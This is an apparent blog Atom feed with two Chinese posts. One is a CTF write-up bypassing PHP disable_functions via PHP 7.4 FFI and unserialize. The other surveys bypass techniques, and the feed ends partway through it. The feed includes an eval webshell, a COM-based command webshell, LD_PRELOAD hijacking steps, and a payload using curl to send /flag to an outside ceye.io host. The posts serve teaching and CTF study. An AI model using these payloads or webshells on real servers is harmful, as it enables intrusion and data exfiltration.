<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Mi1k7ea</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://Mi1k7ea.github.com/"/>
  <updated>2019-06-07T10:00:41.229Z</updated>
  <id>https://Mi1k7ea.github.com/</id>
  
  <author>
    <name>Mi1k7ea</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>从RCTF nextphp看PHP7.4的FFI绕过disable_functions</title>
    <link href="https://Mi1k7ea.github.com/2019/06/07/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E7%9C%8BPHP7-4%E7%9A%84FFI%E7%BB%95%E8%BF%87disable-functions/"/>
    <id>https://Mi1k7ea.github.com/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/</id>
    <published>2019-06-07T08:27:45.000Z</published>
    <updated>2019-06-07T10:00:41.229Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-题目分析"><a href="#0x01-题目分析" class="headerlink" title="0x01 题目分析"></a>0x01 题目分析</h2><p>访问页面，显示源码，是个PHP一句话木马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">'a'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>推测，考察Bypass disable_functions。</p><p>通过<code>?a=phpinfo();</code>查看phpinfo，发现PHP版本为7.4，且open_basedir限制为Web目录：</p><p><img src="/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/1.png" alt=""></p><p>而disable_functions中不仅过滤了所有PHP命令执行函数，还过滤了mail、dl、putenv等函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,putenv,error_log,dl</span><br></pre></td></tr></table></figure><p>Bypass disable_functions的方法无非就那几种。黑名单是无法绕过了，因为所有PHP命令执行函数都被严格过滤了；系统是Linux，不存在COM组件绕过；过滤了dl()函数，无法通过扩展库绕过；过滤了mail和putenv等函数，无法通过LD_PRELOAD方式绕过；过滤了pcntl相关函数，无法通过该组件绕过；系统没有ImageMagick组件等等……</p><p>暂时没有思路，那就看下当前Web目录下有啥文件，此时只能查看Web目录，因为open_basedir限制了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=print_r(scandir(&apos;./&apos;));</span><br></pre></td></tr></table></figure><p><img src="/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/2.png" alt=""></p><p>可以看到有个preload.php。</p><p>难道就没办法Bypass open_basedir了吗？——<strong>使用glob://伪协议</strong></p><p>下面通过glob://伪协议来Bypass open_basedir读取根目录有啥内容，发送之前先进行URL编码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a=<span class="keyword">new</span> DirectoryIterator(<span class="string">"glob:///*"</span>);<span class="keyword">foreach</span>($a <span class="keyword">as</span> $f)&#123;<span class="keyword">echo</span>($f-&gt;__toString().<span class="string">' '</span>);&#125;;</span><br></pre></td></tr></table></figure><p>可以看到根目录下有个flag，这里读是读不到的，但是已经确定了flag在根目录下：</p><p><img src="/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/3.png" alt=""></p><p>回到之前，看下preload.php的源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?a=show_source(&apos;preload.php&apos;);</span><br><span class="line">?a=echo(readfile(&apos;preload.php&apos;));</span><br><span class="line">?a=print_r(readfile(&apos;preload.php&apos;));</span><br><span class="line">?a=echo(file_get_contents(&apos;preload.php&apos;));</span><br><span class="line">?a=print_r(file_get_contents(&apos;preload.php&apos;));</span><br></pre></td></tr></table></figure><p>源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $data = [</span><br><span class="line">        <span class="string">'ret'</span> =&gt; <span class="keyword">null</span>,</span><br><span class="line">        <span class="string">'func'</span> =&gt; <span class="string">'print_r'</span>,</span><br><span class="line">        <span class="string">'arg'</span> =&gt; <span class="string">'1'</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">'ret'</span>] = <span class="keyword">$this</span>-&gt;data[<span class="string">'func'</span>](<span class="keyword">$this</span>-&gt;data[<span class="string">'arg'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__serialize</span><span class="params">()</span>: <span class="title">array</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span><span class="params">(array $data)</span> </span>&#123;</span><br><span class="line">        array_merge(<span class="keyword">$this</span>-&gt;data, $data);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> <span class="params">()</span>: <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span><span class="params">($payload)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = unserialize($payload);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span> <span class="params">($key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$key];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span> <span class="params">($key, $value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">'No implemented'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">'No implemented'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析下这段代码：A类继承了Serializable类，和Java类似，定义了一个可序列化的类；A类有一个成员变量\$data，是一个数组，数组中是字典，键分别保存了ret、func、arg；新增了__serialize()和__unserialize()函数，未见过的写法，其中__unserialize()和unserialize()均调用了run()函数；__set()和__construct()函数都抛出异常，这里主要是__set()，因为我们无法直接通过set的方式来设置\$data的值了；最后是run()函数，它是反序列化漏洞存在的根源，因为它通过成员变量\$data中的func和arg来实现任意函数调用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;data[<span class="string">'ret'</span>] = <span class="keyword">$this</span>-&gt;data[<span class="string">'func'</span>](<span class="keyword">$this</span>-&gt;data[<span class="string">'arg'</span>]);</span><br></pre></td></tr></table></figure><p>至此，之前Bypass disable_functions的方法自然是用不了了。但题目是nextphp，PHP版本为7.4且根据其未见过的一些特性可以推测出应该是用到了7.4版本的新特性了。</p><h2 id="0x02-PHP-7-4-新特性"><a href="#0x02-PHP-7-4-新特性" class="headerlink" title="0x02 PHP 7.4 新特性"></a>0x02 PHP 7.4 新特性</h2><h3 id="自定义对象序列化"><a href="#自定义对象序列化" class="headerlink" title="自定义对象序列化"></a>自定义对象序列化</h3><p>在PHP 7.4的时候，增加了__serialize()和__unserialize()函数，可以用来自定义对象的序列化。其实和Java重写readObject()方法类似。</p><h3 id="Preload"><a href="#Preload" class="headerlink" title="Preload"></a>Preload</h3><p>预加载，允许服务器在启动时在内存中加载PHP文件，并使它们永久可用于所有后续请求，主要用来大幅提升IO性能。</p><p>在php.ini中有一项设置名为opcache.preload，用来指定将在服务器启动时编译和执行的PHP文件，文件中定义的所有函数和大多数类都将永久加载到PHP的函数和类表中，并在将来的任何请求的上下文中永久可用。</p><p>在本题的phpino中可以看到该设置选项：</p><p><img src="/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/4.png" alt=""></p><p>可以看到，该选项设置为preload.php，也就是说服务器在启动时就已经将该文件加载进内存中，后续我们可以直接调用该文件中的类方法即可而无需做多余的操作去加载或包含文件进来。</p><h3 id="FFI"><a href="#FFI" class="headerlink" title="FFI"></a>FFI</h3><p>FFI（Foreign Function Interface），即外部函数接口，允许从用户区调用C代码。简单地说，就是一项让你在PHP里能够调用C代码的技术。</p><p>FFI的使用分为声明和调用两个部分。</p><p>下面看个简单的使用Demo，从共享库中调用printf()函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// create FFI object, loading libc and exporting function printf()</span></span><br><span class="line">$ffi = FFI::cdef(</span><br><span class="line">    <span class="string">"int printf(const char *format, ...);"</span>, <span class="comment">// this is a regular C declaration</span></span><br><span class="line">    <span class="string">"libc.so.6"</span>);</span><br><span class="line"><span class="comment">// call C's printf()</span></span><br><span class="line">$ffi-&gt;printf(<span class="string">"Hello %s!\n"</span>, <span class="string">"world"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>FFI::cdef——创建一个新的FFI对象，可以用于常规C代码的声明，第一个参数为需要声明的C代码，第二个参数为可选项、从哪个共享库中导入；后面直接通过FFI变量调用声明过的C函数即可。</p><p>可在phpinfo中查看FFI是否开启，本题是开启的：</p><p><img src="/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/5.png" alt=""></p><h2 id="0x03-解题思路"><a href="#0x03-解题思路" class="headerlink" title="0x03 解题思路"></a>0x03 解题思路</h2><p>由前面分析可知以下几点可利用的地方：</p><ul><li>Preload配置已经将preload.php预加载到内存中，可直接利用其中的类方法；</li><li>preload.php中的unserialize()函数会调用run()，而run()存在任意函数调用风险；</li><li>index.php中eval会执行PHP代码，会帮助我们执行preload.php中的反序列化操作；</li></ul><p>结合起来，攻击思路如下：</p><ul><li>先利用FFI特性构造恶意序列化内容，用PHP通过FFI声明和调用C中的system()函数；</li><li>利用index.php中的eval来执行反序列化操作；</li><li>最后调用FFI中声明的system()函数执行命令；</li></ul><p>利用FFI的特性构造恶意序列化内容，因为无法直接通过__set()函数设置成员变量\$data，这里就直接修改其键值即可，使其初始化func的初始值为FFI::cdef、arg的初始值为system：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $data = [</span><br><span class="line">        <span class="string">'ret'</span> =&gt; <span class="keyword">null</span>,</span><br><span class="line">        <span class="string">'func'</span> =&gt; <span class="string">'FFI::cdef'</span>,</span><br><span class="line">        <span class="string">'arg'</span> =&gt; <span class="string">'int system(char *command);'</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">'ret'</span>] = <span class="keyword">$this</span>-&gt;data[<span class="string">'func'</span>](<span class="keyword">$this</span>-&gt;data[<span class="string">'arg'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span><span class="params">($payload)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = unserialize($payload);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(serialize(<span class="keyword">new</span> A()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到如下序列化内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:1:&quot;A&quot;:89:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:26:&quot;int system(char *command);&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure><p>构造exp如下，这里利用index.php的eval来限制执行反序列化操作，然后触发run()函数来调用FFI::cdef声明C中的system()函数，然后通过FFI变量调用已声明的system()来执行任意命令，因为可能有特殊编码这里就进行base64加密传送回来：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a=unserialize(<span class="string">'C:1:"A":89:&#123;a:3:&#123;s:3:"ret";N;s:4:"func";s:9:"FFI::cdef";s:3:"arg";s:26:"int system(char *command);";&#125;&#125;'</span>);$a-&gt;ret-&gt;system(<span class="string">'curl xx.ceye.io/?c=`cat /flag|base64`'</span>);</span><br></pre></td></tr></table></figure><p>发送之前，先进行URL编码，最后在ceye收到内容，base64解码即为flag：</p><p><img src="/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/6.png" alt=""></p><p><strong>小结</strong></p><p>本题巧妙利用了PHP 7.4的新特性FFI来Bypass disable_functions。</p><p>当PHP所有的命令执行函数被禁用后，通过PHP 7.4的新特性FFI可以实现用PHP代码调用C代码的方式，先声明C中的命令执行函数，然后再通过FFI变量调用该C函数即可Bypass disable_functions。</p><p>也就是说，通过PHP调用C的命令执行函数来绕过。</p><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://www.php.net/manual/en/book.ffi.php" target="_blank" rel="noopener">Foreign Function Interface</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="PHP" scheme="https://Mi1k7ea.github.com/categories/PHP/"/>
    
    
      <category term="Web安全" scheme="https://Mi1k7ea.github.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="PHP" scheme="https://Mi1k7ea.github.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>浅谈几种Bypass disable_functions的方法</title>
    <link href="https://Mi1k7ea.github.com/2019/06/02/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-disable-functions%E7%9A%84%E6%96%B9%E6%B3%95/"/>
    <id>https://Mi1k7ea.github.com/2019/06/02/浅谈几种Bypass-disable-functions的方法/</id>
    <published>2019-06-02T10:07:10.000Z</published>
    <updated>2019-06-07T04:49:18.480Z</updated>
    
    <content type="html"><![CDATA[<p>Bypass disable_functions的方法有很多，这里先将一些常用的方法小结一下，后面会继续补充各种方法。</p><h2 id="0x01-disable-functions"><a href="#0x01-disable-functions" class="headerlink" title="0x01 disable_functions"></a>0x01 disable_functions</h2><p>disable_functions是php.ini中的一个设置选项，可以用来设置PHP环境禁止使用某些函数，通常是网站管理员为了安全起见，用来禁用某些危险的命令执行函数等。</p><p>我们查看phpinfo的时候，会发现有这么一栏，我本地这里默认是未设置的：</p><p><img src="/2019/06/02/浅谈几种Bypass-disable-functions的方法/1.png" alt=""></p><p>要更改的话打开php.ini，找到对应的行修改即可，这里修改如下：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; This directive allows you to disable certain functions for security reasons.</span></span><br><span class="line"><span class="comment">; It receives a comma-delimited list of function names.</span></span><br><span class="line"><span class="comment">; http://php.net/disable-functions</span></span><br><span class="line"><span class="attr">disable_functions</span> = exec,system,passthru,shell_exec,proc_open,popen,dl,</span><br></pre></td></tr></table></figure><p>注意：eval并非PHP函数，放在disable_functions中是无法禁用的，若要禁用需要用到PHP的扩展Suhosin。</p><p>然后重启服务，在phpinfo中可以看到已经生效：</p><p><img src="/2019/06/02/浅谈几种Bypass-disable-functions的方法/2.png" alt=""></p><p>下面就逐一对各种方法进行简单的归纳。</p><h2 id="0x02-黑名单绕过"><a href="#0x02-黑名单绕过" class="headerlink" title="0x02 黑名单绕过"></a>0x02 黑名单绕过</h2><p>我们知道，disable_functions其实是一个黑名单机制，我们可以通过观察是否存在可利用的漏网之鱼，直接通过其实现绕过即可。</p><p>……</p><h2 id="0x03-利用Windows系统组件COM绕过"><a href="#0x03-利用Windows系统组件COM绕过" class="headerlink" title="0x03 利用Windows系统组件COM绕过"></a>0x03 利用Windows系统组件COM绕过</h2><p>Windows系统组件COM在Windows默认就存在，是位于System32目录下的wshom.ocx文件。</p><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p>先在php.ini中查看是否已经开启com.allow_dcom，若未开启则将前面的;分号去掉：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; allow Distributed-COM calls</span></span><br><span class="line"><span class="comment">; http://php.net/com.allow-dcom</span></span><br><span class="line">com.allow_dcom = true</span><br></pre></td></tr></table></figure><p>然后在php/ext/里面查找是否存在php_com_dotnet.dll这个文件。</p><p>再到php.ini中查看是否存在extension=php_com_dotnet.dll这项，有的话去掉注释开启，否则直接添加上去即可。</p><p>重启服务，在phpinfo中查看是否开启了：</p><p><img src="/2019/06/02/浅谈几种Bypass-disable-functions的方法/3.png" alt=""></p><h3 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h3><p>前提通过phpinfo知道disable_functions选项如下：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">disable_functions</span> = exec,system,passthru,shell_exec,proc_open,popen,dl,</span><br></pre></td></tr></table></figure><p>此时在Web服务器中写入任意的以上函数的WebShell都是无法执行命令的。</p><p>上传comshell.php至Web服务器中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$command = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line">$wsh = <span class="keyword">new</span> COM(<span class="string">'WScript.shell'</span>); <span class="comment">// 生成一个COM对象　Shell.Application也能</span></span><br><span class="line">$exec = $wsh-&gt;exec(<span class="string">"cmd /c"</span>.$command); <span class="comment">//调用对象方法来执行命令</span></span><br><span class="line">$stdout = $exec-&gt;StdOut();</span><br><span class="line">$stroutput = $stdout-&gt;ReadAll();</span><br><span class="line"><span class="keyword">echo</span> $stroutput;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里创建一个COM对象，然后通过调用COM对象的exec()方法来实现执行系统命令，从而绕过disable_functions禁用PHP命令执行函数的限制：</p><p><img src="/2019/06/02/浅谈几种Bypass-disable-functions的方法/4.png" alt=""></p><h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><p>彻底的解决方案是直接删除System32目录下wshom.ocx文件。</p><h2 id="0x04-利用LD-PRELOAD绕过"><a href="#0x04-利用LD-PRELOAD绕过" class="headerlink" title="0x04 利用LD_PRELOAD绕过"></a>0x04 利用LD_PRELOAD绕过</h2><p>LD_PRELOAD是Linux中的环境变量，可以设置成一个指定库的路径，动态链接时较其他库有着更高的优先级，允许预加载指定库中的函数和符号覆盖掉后续链接的库中的函数和符号。即可以通过重定向共享库函数来进行运行时修复。这项技术可用于绕过反调试代码，也可以用作用户机rootkit。</p><h3 id="Method1——劫持getuid"><a href="#Method1——劫持getuid" class="headerlink" title="Method1——劫持getuid()"></a>Method1——劫持getuid()</h3><h4 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h4><p>前提是在Linux中已安装并启用sendmail程序。</p><p>php的mail()函数在执行过程中会默认调用系统程序/usr/sbin/sendmail，而/usr/sbin/sendmail会调用getuid()。如果我们能通过LD_PRELOAD的方式来劫持getuid()，再用mail()函数来触发sendmail程序进而执行被劫持的getuid()，从而就能执行恶意代码了。</p><p>细化一下：</p><ul><li>编写一个原型为 uid_t getuid(void); 的 C 函数，内部执行攻击者指定的代码，并编译成共享对象 evil.so；</li><li>运行 PHP 函数 putenv()，设定环境变量 LD_PRELOAD 为 evil.so，以便后续启动新进程时优先加载该共享对象；</li><li>运行 PHP 的 mail() 函数，mail() 内部启动新进程 /usr/sbin/sendmail，由于上一步 LD_PRELOAD 的作用，sendmail 调用的系统函数 getuid() 被优先级更好的 evil.so 中的同名 getuid() 所劫持；</li><li>达到不调用 PHP 的各种命令执行函数（system()、exec() 等等）仍可执行系统命令的目的。</li></ul><h4 id="调用过程分析"><a href="#调用过程分析" class="headerlink" title="调用过程分析"></a>调用过程分析</h4><p>先调用如下命令可查看sendmail程序可能调用的系统API明细：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@sq:/tmp<span class="comment"># readelf -Ws /usr/sbin/sendmail | grep getuid</span></span><br><span class="line">    90: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND getuid@GLIBC_2.2.5 (3)</span><br></pre></td></tr></table></figure><p>或如下命令也可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@sq:/tmp<span class="comment"># nm -D /usr/sbin/sendmail 2&gt;&amp;1 | grep getuid</span></span><br><span class="line">                 U getuid</span><br></pre></td></tr></table></figure><p>由于程序运行时会根据命令行选项、运行环境作出不同反应，导致真正运行时调用的API可能只是readelf查看的子集，通过如下命令跟踪查看sendmail程序的实际API调用情况：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@sq:/tmp<span class="comment"># strace -f /usr/sbin/sendmail 2&gt;&amp;1 | grep -A5 -B5 getuid</span></span><br><span class="line">fstat(3, &#123;st_mode=S_IFCHR|0666, st_rdev=makedev(1, 9), ...&#125;) = 0</span><br><span class="line">getrusage(0x1 /* RUSAGE_??? */, &#123;ru_utime=&#123;0, 0&#125;, ru_stime=&#123;0, 4000&#125;, ...&#125;) = 0</span><br><span class="line"><span class="built_in">read</span>(3, <span class="string">"#\315o=\302\4\363h\252\273\332R\364\261skcQ\267|B&amp;j\177\210\330q\0379\f\7\216"</span>, 32) = 32</span><br><span class="line"><span class="built_in">read</span>(3, <span class="string">"\351o\235\336\220\364BVj\346\261\244\200\34S\207\332f\230\231\234V*\302BHg\304\3108jK"</span>, 32) = 32</span><br><span class="line"><span class="built_in">read</span>(3, <span class="string">"9\21\203\254\35,\306\241"</span>, 8)  = 8</span><br><span class="line">getuid()                                = 0</span><br><span class="line">getgid()                                = 0</span><br><span class="line">getrlimit(RLIMIT_NOFILE, &#123;rlim_cur=65535, rlim_max=65535&#125;) = 0</span><br><span class="line">fstat(0, &#123;st_mode=S_IFCHR|0600, st_rdev=makedev(136, 2), ...&#125;) = 0</span><br><span class="line">fstat(1, &#123;st_mode=S_IFIFO|0600, st_size=0, ...&#125;) = 0</span><br><span class="line">fstat(2, &#123;st_mode=S_IFIFO|0600, st_size=0, ...&#125;) = 0</span><br></pre></td></tr></table></figure><p>可以看到，sendmail程序确实调用了getuid()函数。</p><p>接着用<code>man 2 getuid</code>查看函数原型：</p><p><img src="/2019/06/02/浅谈几种Bypass-disable-functions的方法/7.png" alt=""></p><p>现在知道sendmail程序会调用getuid()函数以及getuid()函数的原型，剩下的问题就是寻找在PHP中除了那些命令执行函数外会调用sendmail程序的函数了。</p><p>sendmail程序，顾名思义，就是发送邮件的功能，由此自然而然地联想到PHP的mail()函数，写段测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mail(<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后运行如下命令查看mail()是否启动新进程：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@sq:/tmp<span class="comment"># strace -f php mail.php 2&gt;&amp;1 | grep -A2 -B2 execve</span></span><br><span class="line">execve(<span class="string">"/usr/bin/php"</span>, [<span class="string">"php"</span>, <span class="string">"mail.php"</span>], [/* 24 vars */]) = 0</span><br><span class="line">brk(NULL)                               = 0x562bdab47000</span><br><span class="line">access(<span class="string">"/etc/ld.so.nohwcap"</span>, F_OK)      = -1 ENOENT (No such file or directory)</span><br><span class="line">--</span><br><span class="line">[pid 29094] &lt;... dup2 resumed&gt; )        = 0</span><br><span class="line">[pid 29093] wait4(29094,  &lt;unfinished 